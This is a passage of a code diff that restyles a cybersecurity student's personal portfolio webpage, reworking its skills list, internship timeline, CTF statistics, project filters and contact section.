+                    <div class="grid grid-cols-1 gap-8 lg:grid-cols-12 lg:items-center">
+                        <div class="space-y-4 lg:col-span-8">
+                            <p class="text-sm leading-relaxed text-slate-300 sm:text-base">
+                                I am pursuing a <span class="font-semibold text-white">B.Tech in Electrical Engineering (3rd Year / 5th Semester)</span> at
+                                <span class="font-semibold text-white">Odisha University of Technology and Research (OUTR), Bhubaneswar</span>, Odisha.
+                            </p>
+                            <p class="text-sm leading-relaxed text-slate-300 sm:text-base">
+                                My focus sits at the intersection of offensive cybersecurity and software engineering—building full-scale CTF competitions like <span class="text-neonCyan font-medium">HackCTF (60 challenges)</span>, testing web applications against OWASP Top 10 vulnerabilities, and sharpening exploitation fundamentals across
+                                <span class="text-neonEmerald font-mono">OverTheWire Bandit (33/33)</span>, <span class="text-neonCyan">PortSwigger Web Security Academy</span>, <span class="text-neonCyan">TryHackMe</span>, and <span class="text-neonCyan">picoCTF</span>.
+                            </p>
+                        </div>
+
+                        <div class="grid grid-cols-3 gap-3 lg:col-span-4">
+                            <div class="rounded-xl border border-borderDark bg-obsidian/80 p-4 text-center">
+                                <div class="font-mono text-xl font-bold text-neonEmerald">60+</div>
+                                <div class="mt-1 font-mono text-[10px] uppercase text-slate-400">CTF Challenges</div>
                             </div>
-
-                            <!-- Interactive Quick Command Output -->
-                            <div id="termExtraOutput" class="hidden rounded-lg border border-cyberCyan/20 bg-navy/80 p-3 text-slate-200"></div>
-
-                            <!-- Interactive Command Pills -->
-                            <div class="pt-1">
-                                <div class="mb-2 flex items-center gap-1.5 text-[11px] text-slate-400">
-                                    <span class="text-cyberEmerald">$</span>
-                                    <span>run quick command:</span>
-                                    <span class="inline-block h-3.5 w-1.5 bg-cyberCyan cursor-blink"></span>
-                                </div>
-                                <div class="flex flex-wrap gap-2">
-                                    <button type="button" data-cmd="whoami"
-                                        class="term-cmd-btn rounded-md border border-slate-700 bg-obsidian px-2.5 py-1 text-[11px] text-cyberCyan transition hover:border-cyberCyan hover:bg-cyberCyan/10">
-                                        ./whoami
-                                    </button>
-                                    <button type="button" data-cmd="ctf"
-                                        class="term-cmd-btn rounded-md border border-slate-700 bg-obsidian px-2.5 py-1 text-[11px] text-cyberEmerald transition hover:border-cyberEmerald hover:bg-cyberEmerald/10">
-                                        ./ctf_stats
-                                    </button>
-                                    <button type="button" data-cmd="contact"
-                                        class="term-cmd-btn rounded-md border border-slate-700 bg-obsidian px-2.5 py-1 text-[11px] text-amber-300 transition hover:border-amber-300 hover:bg-amber-300/10">
-                                        ./contact
-                                    </button>
-                                </div>
+                            <div class="rounded-xl border border-borderDark bg-obsidian/80 p-4 text-center">
+                                <div class="font-mono text-xl font-bold text-neonCyan">33/33</div>
+                                <div class="mt-1 font-mono text-[10px] uppercase text-slate-400">OTW Bandit</div>
+                            </div>
+                            <div class="rounded-xl border border-borderDark bg-obsidian/80 p-4 text-center">
+                                <div class="font-mono text-xl font-bold text-white">2</div>
+                                <div class="mt-1 font-mono text-[10px] uppercase text-slate-400">Internships</div>
                             </div>
                         </div>
                     </div>
@@ -319,376 +476,280 @@
             </div>
         </section>
 
-        <!-- ==================== ABOUT ME & EXPERIENCE ==================== -->
-        <section id="about" class="border-t border-slate-800/70 bg-navy/30 py-20">
+        <!-- 3. TECHNICAL ARSENAL (SKILLS) -->
+        <section id="skills" class="border-t border-borderDark/80 py-20">
             <div class="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
-                <!-- Section Header -->
-                <div class="mb-12">
-                    <p class="font-mono text-xs font-semibold uppercase tracking-widest text-cyberCyan">01 // Background</p>
-                    <h2 class="mt-2 font-display text-3xl font-bold text-white sm:text-4xl">About Me &amp; Experience</h2>
-                </div>
-
-                <div class="grid grid-cols-1 gap-10 lg:grid-cols-12">
-                    <!-- Left Column: Narrative & Highlights -->
-                    <div class="space-y-6 lg:col-span-5">
-                        <div class="glass-card rounded-2xl p-6 sm:p-7">
-                            <h3 class="font-display text-xl font-bold text-white">Bridging Hardware, Code &amp; Security</h3>
-                            <p class="mt-4 text-sm leading-relaxed text-slate-300 sm:text-base">
-                                I am pursuing a <span class="font-semibold text-white">B.Tech in Electrical Engineering</span> at
-                                <span class="font-semibold text-white">Odisha University of Technology and Research (OUTR), Bhubaneswar</span>.
-                                Alongside my core engineering studies, I immerse myself in offensive cybersecurity and full-stack software engineering.
-                            </p>
-                            <p class="mt-4 text-sm leading-relaxed text-slate-300 sm:text-base">
-                                On the offensive security front, I actively sharpen my exploitation and red-teaming mindset on
-                                <span class="text-cyberCyan">PortSwigger Web Security Academy</span>,
-                                <span class="text-cyberCyan">TryHackMe</span>,
-                                <span class="text-cyberCyan">picoCTF</span>, and completed
-                                <span class="font-mono text-cyberEmerald">OverTheWire Bandit (33/33)</span>.
-                                On the development side, I build full-stack <span class="font-medium text-white">MERN</span> applications, Python security tooling, and interactive CTF arenas—while mentoring peers through campus tech leadership.
-                            </p>
-
-                            <!-- Quick Stat Cards -->
-                            <div class="mt-6 grid grid-cols-3 gap-3 border-t border-slate-800 pt-5">
-                                <div class="rounded-xl border border-slate-800 bg-obsidian/70 p-3 text-center">
-                                    <div class="font-display text-xl font-bold text-cyberCyan">60+</div>
-                                    <div class="mt-0.5 font-mono text-[10px] uppercase text-slate-400">CTF Challenges</div>
-                                </div>
-                                <div class="rounded-xl border border-slate-800 bg-obsidian/70 p-3 text-center">
-                                    <div class="font-display text-xl font-bold text-cyberEmerald">33/33</div>
-                                    <div class="mt-0.5 font-mono text-[10px] uppercase text-slate-400">OTW Bandit</div>
-                                </div>
-                                <div class="rounded-xl border border-slate-800 bg-obsidian/70 p-3 text-center">
-                                    <div class="font-display text-xl font-bold text-white">2+</div>
-                                    <div class="mt-0.5 font-mono text-[10px] uppercase text-slate-400">Internships</div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Right Column: Experience & Leadership Timeline -->
-                    <div class="lg:col-span-7">
-                        <div class="relative space-y-5 before:absolute before:top-2 before:bottom-2 before:left-4 before:w-px before:bg-gradient-to-b before:from-cyberCyan before:via-cyberEmerald/60 before:to-slate-800 sm:before:left-5">
-
-                            <!-- Timeline Item 1 -->
-                            <article class="relative pl-11 sm:pl-14">
-                                <span class="absolute top-5 left-2.5 h-3.5 w-3.5 rounded-full border-2 border-cyberCyan bg-obsidian shadow-cyan-glow sm:left-3.5"></span>
-                                <div class="glass-card rounded-2xl p-5 transition hover:border-cyberCyan/40">
-                                    <div class="flex flex-wrap items-center justify-between gap-2">
-                                        <h3 class="font-display text-base font-bold text-white sm:text-lg">Event Coordinator &amp; Platform Creator — HackCTF (HackFest 2026)</h3>
-                                        <span class="rounded-full border border-cyberCyan/30 bg-cyberCyan/10 px-2.5 py-0.5 font-mono text-[11px] text-cyberCyan">Nov 2026</span>
-                                    </div>
-                                    <p class="mt-2 text-sm leading-relaxed text-slate-300">
-                                        Organized OUTR's first-ever offline Jeopardy-style CTF in partnership with <span class="text-white font-medium">OffSecDiary</span>, delivering 60 custom challenges across 7 categories and leading a hands-on cybersecurity workshop.
-                                    </p>
-                                </div>
-                            </article>
-
-                            <!-- Timeline Item 2 -->
-                            <article class="relative pl-11 sm:pl-14">
-                                <span class="absolute top-5 left-2.5 h-3.5 w-3.5 rounded-full border-2 border-cyberEmerald bg-obsidian sm:left-3.5"></span>
-                                <div class="glass-card rounded-2xl p-5 transition hover:border-cyberEmerald/40">
-                                    <div class="flex flex-wrap items-center justify-between gap-2">
-                                        <h3 class="font-display text-base font-bold text-white sm:text-lg">Coordinator &amp; Cybersecurity Mentor — Energy Club, OUTR</h3>
-                                        <span class="rounded-full border border-cyberEmerald/30 bg-cyberEmerald/10 px-2.5 py-0.5 font-mono text-[11px] text-cyberEmerald">2026 – Present</span>
-                                    </div>
-                                    <p class="mt-2 text-sm leading-relaxed text-slate-300">
-                                        Leading club operations, coordinating <span class="text-white font-medium">VRIDDHI 6.0</span> inductions, and mentoring juniors along the Cybersecurity skills pathway.
-                                    </p>
-                                </div>
-                            </article>
-
-                            <!-- Timeline Item 3 -->
-                            <article class="relative pl-11 sm:pl-14">
-                                <span class="absolute top-5 left-2.5 h-3.5 w-3.5 rounded-full border-2 border-cyberCyan/70 bg-obsidian sm:left-3.5"></span>
-                                <div class="glass-card rounded-2xl p-5 transition hover:border-cyberCyan/40">
-                                    <div class="flex flex-wrap items-center justify-between gap-2">
-                                        <h3 class="font-display text-base font-bold text-white sm:text-lg">Cybersecurity Intern — UptoSkills</h3>
-                                        <span class="rounded-full border border-slate-700 bg-obsidian px-2.5 py-0.5 font-mono text-[11px] text-slate-300">Aug – Oct 2026</span>
-                                    </div>
-                                    <p class="mt-2 text-sm leading-relaxed text-slate-300">
-                                        Conducted structured target reconnaissance, OSINT gathering, and automated vulnerability testing using SQLmap across test web environments.
-                                    </p>
-                                </div>
-                            </article>
-
-                            <!-- Timeline Item 4 -->
-                            <article class="relative pl-11 sm:pl-14">
-                                <span class="absolute top-5 left-2.5 h-3.5 w-3.5 rounded-full border-2 border-cyberEmerald/70 bg-obsidian sm:left-3.5"></span>
-                                <div class="glass-card rounded-2xl p-5 transition hover:border-cyberEmerald/40">
-                                    <div class="flex flex-wrap items-center justify-between gap-2">
-                                        <h3 class="font-display text-base font-bold text-white sm:text-lg">AI Web Development Intern — InAmigos Foundation</h3>
-                                        <span class="rounded-full border border-slate-700 bg-obsidian px-2.5 py-0.5 font-mono text-[11px] text-slate-300">Aug – Sept 2026</span>
-                                    </div>
-                                    <p class="mt-2 text-sm leading-relaxed text-slate-300">
-                                        Built responsive NGO awareness webpages, performed comprehensive Figma UX improvement audits, and earned <span class="text-cyberEmerald font-medium">Top Performer</span> recognition.
-                                    </p>
-                                </div>
-                            </article>
-
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- ==================== TECHNICAL ARSENAL (SKILLS) ==================== -->
-        <section id="skills" class="border-t border-slate-800/70 py-20">
-            <div class="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
-                <div class="mb-12">
-                    <p class="font-mono text-xs font-semibold uppercase tracking-widest text-cyberEmerald">02 // Capabilities</p>
-                    <h2 class="mt-2 font-display text-3xl font-bold text-white sm:text-4xl">Technical Arsenal</h2>
-                    <p class="mt-2 max-w-2xl text-sm text-slate-400 sm:text-base">
-                        Tools, languages, and frameworks I use to build full-stack web apps, uncover vulnerabilities, and prototype hardware-backed security demos.
-                    </p>
+                <div class="mb-10">
+                    <p class="font-mono text-xs font-semibold uppercase tracking-widest text-neonCyan">02 // Technical Arsenal</p>
+                    <h2 class="mt-2 text-3xl font-bold tracking-tight text-white sm:text-4xl">Skills &amp; Tooling</h2>
                 </div>
 
                 <div class="grid grid-cols-1 gap-6 md:grid-cols-3">
-                    <!-- Category 1: Offensive Security & Tools -->
-                    <div class="glass-card flex flex-col rounded-2xl p-6 transition hover:border-cyberCyan/40">
+                    <!-- Column 1: Offensive Security & Pentesting -->
+                    <div class="cyber-panel hover-lift rounded-2xl p-6">
                         <div class="mb-4 flex items-center gap-3">
-                            <span class="flex h-10 w-10 items-center justify-center rounded-xl border border-cyberCyan/30 bg-cyberCyan/10 text-cyberCyan">
+                            <span class="flex h-10 w-10 items-center justify-center rounded-xl border border-neonEmerald/35 bg-neonEmerald/10 text-neonEmerald">
                                 <svg class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                                     <path stroke-linecap="round" stroke-linejoin="round"
                                         d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                                 </svg>
                             </span>
-                            <h3 class="font-display text-lg font-bold text-white">Offensive Security &amp; Tools</h3>
+                            <h3 class="text-base font-bold text-white">Offensive Security &amp; Pentesting</h3>
                         </div>
                         <div class="flex flex-wrap gap-2">
-                            <span class="rounded-lg border border-cyberCyan/20 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Penetration Testing</span>
-                            <span class="rounded-lg border border-cyberCyan/20 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Web Exploitation</span>
-                            <span class="rounded-lg border border-cyberCyan/20 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">OSINT</span>
-                            <span class="rounded-lg border border-cyberCyan/20 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">CTF Design</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-cyberCyan">Kali Linux</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-cyberCyan">Burp Suite</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Wireshark</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Nmap</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">SQLmap</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Gobuster</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">FFUF</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Nikto</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Netcat</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">OpenSSL</span>
+                            <span class="rounded-lg border border-neonEmerald/30 bg-obsidian px-2.5 py-1 font-mono text-xs text-neonEmerald">Burp Suite</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Wireshark</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Nmap</span>
+                            <span class="rounded-lg border border-neonEmerald/30 bg-obsidian px-2.5 py-1 font-mono text-xs text-neonEmerald">SQLmap</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Gobuster</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">FFUF</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Nikto</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Kali Linux</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">OWASP Top 10</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">OSINT</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">CTF Design</span>
                         </div>
                     </div>
 
-                    <!-- Category 2: Web & Software Development -->
-                    <div class="glass-card flex flex-col rounded-2xl p-6 transition hover:border-cyberEmerald/40">
+                    <!-- Column 2: Full-Stack & Scripting -->
+                    <div class="cyber-panel hover-lift rounded-2xl p-6">
                         <div class="mb-4 flex items-center gap-3">
-                            <span class="flex h-10 w-10 items-center justify-center rounded-xl border border-cyberEmerald/30 bg-cyberEmerald/10 text-cyberEmerald">
+                            <span class="flex h-10 w-10 items-center justify-center rounded-xl border border-neonCyan/35 bg-neonCyan/10 text-neonCyan">
                                 <svg class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                                     <path stroke-linecap="round" stroke-linejoin="round" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" />
                                 </svg>
                             </span>
-                            <h3 class="font-display text-lg font-bold text-white">Web &amp; Software Dev</h3>
+                            <h3 class="text-base font-bold text-white">Full-Stack &amp; Scripting</h3>
                         </div>
                         <div class="flex flex-wrap gap-2">
-                            <span class="rounded-lg border border-cyberEmerald/25 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-cyberEmerald">MongoDB</span>
-                            <span class="rounded-lg border border-cyberEmerald/25 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-cyberEmerald">Express.js</span>
-                            <span class="rounded-lg border border-cyberEmerald/25 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-cyberEmerald">React.js</span>
-                            <span class="rounded-lg border border-cyberEmerald/25 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-cyberEmerald">Node.js (MERN)</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">HTML5</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">CSS3</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">JavaScript</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Tailwind CSS</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Python</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">C++</span>
+                            <span class="rounded-lg border border-neonCyan/30 bg-obsidian px-2.5 py-1 font-mono text-xs text-neonCyan">Python</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">React.js</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Tailwind CSS</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Node.js</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Express.js</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">MongoDB</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">SQLite</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">C/C++</span>
+                            <span class="rounded-lg border border-neonCyan/30 bg-obsidian px-2.5 py-1 font-mono text-xs text-neonCyan">Bash</span>
                         </div>
                     </div>
 
-                    <!-- Category 3: Design & Hardware -->
-                    <div class="glass-card flex flex-col rounded-2xl p-6 transition hover:border-amber-400/40">
+                    <!-- Column 3: Hardware & Design -->
+                    <div class="cyber-panel hover-lift rounded-2xl p-6">
                         <div class="mb-4 flex items-center gap-3">
-                            <span class="flex h-10 w-10 items-center justify-center rounded-xl border border-amber-400/30 bg-amber-400/10 text-amber-300">
+                            <span class="flex h-10 w-10 items-center justify-center rounded-xl border border-amber-400/35 bg-amber-400/10 text-amber-300">
                                 <svg class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                                     <path stroke-linecap="round" stroke-linejoin="round"
                                         d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z" />
                                 </svg>
                             </span>
-                            <h3 class="font-display text-lg font-bold text-white">Design &amp; Hardware</h3>
+                            <h3 class="text-base font-bold text-white">Hardware &amp; Design</h3>
                         </div>
                         <div class="flex flex-wrap gap-2">
-                            <span class="rounded-lg border border-amber-400/20 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-amber-200">Figma</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Canva</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">UI/UX Wireframing</span>
-                            <span class="rounded-lg border border-amber-400/20 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-amber-200">Arduino UNO</span>
-                            <span class="rounded-lg border border-slate-700/80 bg-obsidian/80 px-3 py-1.5 font-mono text-xs text-slate-200">Embedded Prototyping</span>
+                            <span class="rounded-lg border border-amber-400/30 bg-obsidian px-2.5 py-1 font-mono text-xs text-amber-200">Arduino UNO</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Embedded Prototyping</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Figma</span>
+                            <span class="rounded-lg border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-xs text-slate-200">Canva</span>
                         </div>
                     </div>
                 </div>
             </div>
         </section>
 
-        <!-- ==================== FEATURED PROJECTS ==================== -->
-        <section id="projects" class="border-t border-slate-800/70 bg-navy/30 py-20">
+        <!-- 4. EXPERIENCE & LEADERSHIP TIMELINE -->
+        <section id="experience" class="border-t border-borderDark/80 bg-panel/35 py-20">
             <div class="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
-                <!-- Header + Filter Tabs -->
+                <div class="mb-12">
+                    <p class="font-mono text-xs font-semibold uppercase tracking-widest text-neonEmerald">03 // Track Record</p>
+                    <h2 class="mt-2 text-3xl font-bold tracking-tight text-white sm:text-4xl">Experience &amp; Leadership</h2>
+                </div>
+
+                <div class="relative space-y-6 before:absolute before:top-2 before:bottom-2 before:left-4 before:w-px before:bg-gradient-to-b before:from-neonEmerald before:via-neonCyan/60 before:to-borderDark sm:before:left-5">
+                    <!-- Role 1 -->
+                    <article class="relative pl-11 sm:pl-14">
+                        <span class="absolute top-6 left-2.5 h-3.5 w-3.5 rounded-full border-2 border-neonEmerald bg-obsidian shadow-emerald-glow sm:left-3.5"></span>
+                        <div class="cyber-panel hover-lift rounded-2xl p-6">
+                            <div class="flex flex-wrap items-center justify-between gap-2">
+                                <h3 class="text-lg font-bold text-white">Event Coordinator &amp; Platform Builder — HackCTF (OUTR HackFest &times; OffSecDiary)</h3>
+                                <span class="rounded-full border border-neonEmerald/30 bg-neonEmerald/10 px-3 py-0.5 font-mono text-xs text-neonEmerald">Nov 2026</span>
+                            </div>
+                            <p class="mt-2.5 text-sm leading-relaxed text-slate-300">
+                                Organized OUTR's first offline Jeopardy-style CTF, built the custom arena with a browser Linux sandbox and 60 challenges (7,100 pts), and led a hands-on cybersecurity workshop.
+                            </p>
+                        </div>
+                    </article>
+
+                    <!-- Role 2 -->
+                    <article class="relative pl-11 sm:pl-14">
+                        <span class="absolute top-6 left-2.5 h-3.5 w-3.5 rounded-full border-2 border-neonCyan bg-obsidian sm:left-3.5"></span>
+                        <div class="cyber-panel hover-lift rounded-2xl p-6">
+                            <div class="flex flex-wrap items-center justify-between gap-2">
+                                <h3 class="text-lg font-bold text-white">Cybersecurity Pathway Lead &amp; Coordinator — Energy Club, OUTR</h3>
+                                <span class="rounded-full border border-neonCyan/30 bg-neonCyan/10 px-3 py-0.5 font-mono text-xs text-neonCyan">Aug 2026 – Present</span>
+                            </div>
+                            <p class="mt-2.5 text-sm leading-relaxed text-slate-300">
+                                Coordinate club initiatives including VRIDDHI 6.0 inductions and mentor student cohorts along the Cybersecurity skills pathway covering Linux fundamentals, reconnaissance, and CTF methodologies.
+                            </p>
+                        </div>
+                    </article>
+
+                    <!-- Role 3 -->
+                    <article class="relative pl-11 sm:pl-14">
+                        <span class="absolute top-6 left-2.5 h-3.5 w-3.5 rounded-full border-2 border-neonEmerald/75 bg-obsidian sm:left-3.5"></span>
+                        <div class="cyber-panel hover-lift rounded-2xl p-6">
+                            <div class="flex flex-wrap items-center justify-between gap-2">
+                                <h3 class="text-lg font-bold text-white">Cybersecurity Intern — UptoSkills</h3>
+                                <span class="rounded-full border border-borderDark bg-obsidian px-3 py-0.5 font-mono text-xs text-slate-300">Aug 2026 – Oct 2026</span>
+                            </div>
+                            <p class="mt-2.5 text-sm leading-relaxed text-slate-300">
+                                Performed target reconnaissance, OSINT gathering, web enumeration, and automated SQL injection vulnerability testing using SQLmap across test web environments.
+                            </p>
+                        </div>
+                    </article>
+
+                    <!-- Role 4 -->
+                    <article class="relative pl-11 sm:pl-14">
+                        <span class="absolute top-6 left-2.5 h-3.5 w-3.5 rounded-full border-2 border-neonCyan/75 bg-obsidian sm:left-3.5"></span>
+                        <div class="cyber-panel hover-lift rounded-2xl p-6">
+                            <div class="flex flex-wrap items-center justify-between gap-2">
+                                <h3 class="text-lg font-bold text-white">Web Development Intern — InAmigos Foundation</h3>
+                                <span class="rounded-full border border-borderDark bg-obsidian px-3 py-0.5 font-mono text-xs text-slate-300">Aug 2026 – Sept 2026</span>
+                            </div>
+                            <p class="mt-2.5 text-sm leading-relaxed text-slate-300">
+                                Delivered responsive NGO awareness webpages, an AI web prototype with authentication, and a Figma UX improvement audit, earning Top Performer recognition.
+                            </p>
+                        </div>
+                    </article>
+                </div>
+            </div>
+        </section>
+
+        <!-- 5. FILTERABLE PROJECTS SECTION -->
+        <section id="projects" class="border-t border-borderDark/80 py-20">
+            <div class="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
                 <div class="mb-10 flex flex-col justify-between gap-6 md:flex-row md:items-end">
                     <div>
-                        <p class="font-mono text-xs font-semibold uppercase tracking-widest text-cyberCyan">03 // Portfolio</p>
-                        <h2 class="mt-2 font-display text-3xl font-bold text-white sm:text-4xl">Featured Projects</h2>
+                        <p class="font-mono text-xs font-semibold uppercase tracking-widest text-neonCyan">04 // Projects</p>
+                        <h2 class="mt-2 text-3xl font-bold tracking-tight text-white sm:text-4xl">Featured Builds</h2>
                     </div>
 
-                    <!-- Interactive Category Filter Tabs -->
-                    <div role="tablist" aria-label="Filter projects by category"
-                        class="inline-flex flex-wrap gap-2 rounded-xl border border-slate-800 bg-obsidian/80 p-1.5">
+                    <!-- Filter Tabs -->
+                    <div role="tablist" aria-label="Filter projects"
+                        class="inline-flex flex-wrap gap-2 rounded-xl border border-borderDark bg-obsidian/90 p-1.5">
                         <button type="button" data-filter="all" role="tab" aria-selected="true"
-                            class="filter-btn rounded-lg bg-cyberCyan px-4 py-2 font-mono text-xs font-bold text-obsidian transition">
-                            All (7)
+                            class="filter-btn rounded-lg bg-neonEmerald px-4 py-2 font-mono text-xs font-bold text-obsidian transition">
+                            All (6)
                         </button>
                         <button type="button" data-filter="cybersecurity" role="tab" aria-selected="false"
-                            class="filter-btn rounded-lg px-4 py-2 font-mono text-xs font-semibold text-slate-300 transition hover:text-cyberCyan">
-                            Cybersecurity (5)
+                            class="filter-btn rounded-lg px-4 py-2 font-mono text-xs font-semibold text-slate-300 transition hover:text-neonEmerald">
+                            Cybersecurity (4)
                         </button>
                         <button type="button" data-filter="webdev" role="tab" aria-selected="false"
-                            class="filter-btn rounded-lg px-4 py-2 font-mono text-xs font-semibold text-slate-300 transition hover:text-cyberEmerald">
+                            class="filter-btn rounded-lg px-4 py-2 font-mono text-xs font-semibold text-slate-300 transition hover:text-neonCyan">
                             Web Dev (5)
                         </button>
                     </div>
                 </div>
 
-                <!-- Projects Grid (Rendered cleanly via JS for smooth filtering) -->
+                <!-- Projects Grid -->
                 <div id="projectsGrid" class="grid grid-cols-1 gap-6 md:grid-cols-2 lg:grid-cols-3"></div>
+
+                <!-- Writeups Cross-Link Banner -->
+                <div class="mt-10 flex flex-col items-start justify-between gap-4 rounded-2xl border border-neonEmerald/30 bg-panel/90 p-6 sm:flex-row sm:items-center">
+                    <div>
+                        <p class="font-mono text-xs font-semibold uppercase tracking-wider text-neonEmerald">Vulnerability Research &amp; Bug Reports</p>
+                        <p class="mt-1 text-base font-semibold text-white">Looking for my OWASP Juice Shop bug report &amp; security writeups?</p>
+                    </div>
+                    <a href="#writeups"
+                        class="inline-flex shrink-0 items-center gap-2 rounded-xl border border-neonEmerald/40 bg-neonEmerald/10 px-5 py-2.5 font-mono text-xs font-bold text-neonEmerald transition hover:bg-neonEmerald hover:text-obsidian">
+                        Open Writeups Hub &rarr;
+                    </a>
+                </div>
             </div>
         </section>
 
-        <!-- ==================== CONTACT & SOCIAL MEDIA ==================== -->
-        <section id="contact" class="border-t border-slate-800/70 py-20">
+        <!-- 6. CONTACT & SOCIAL HUB -->
+        <section id="contact" class="border-t border-borderDark/80 bg-panel/35 py-20">
             <div class="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
                 <div class="mb-12">
-                    <p class="font-mono text-xs font-semibold uppercase tracking-widest text-cyberEmerald">04 // Connect</p>
-                    <h2 class="mt-2 font-display text-3xl font-bold text-white sm:text-4xl">Get in Touch</h2>
+                    <p class="font-mono text-xs font-semibold uppercase tracking-widest text-neonEmerald">05 // Connect</p>
+                    <h2 class="mt-2 text-3xl font-bold tracking-tight text-white sm:text-4xl">Contact &amp; Social Hub</h2>
                     <p class="mt-2 max-w-2xl text-sm text-slate-400 sm:text-base">
-                        Open to cybersecurity internships, CTF collaborations, full-stack web development roles, and technical workshops. Feel free to reach out directly.
+                        Open to cybersecurity internships, CTF developer opportunities, and collaborative security research.
                     </p>
                 </div>
 
                 <div class="grid grid-cols-1 gap-8 lg:grid-cols-12">
-                    <!-- Left Column: Direct Contact Cards -->
+                    <!-- Direct Contact Cards -->
                     <div class="space-y-4 lg:col-span-5">
-                        <!-- Email Card with Copy Button -->
-                        <div class="glass-card rounded-2xl p-5 transition hover:border-cyberCyan/40">
-                            <div class="flex items-start justify-between gap-3">
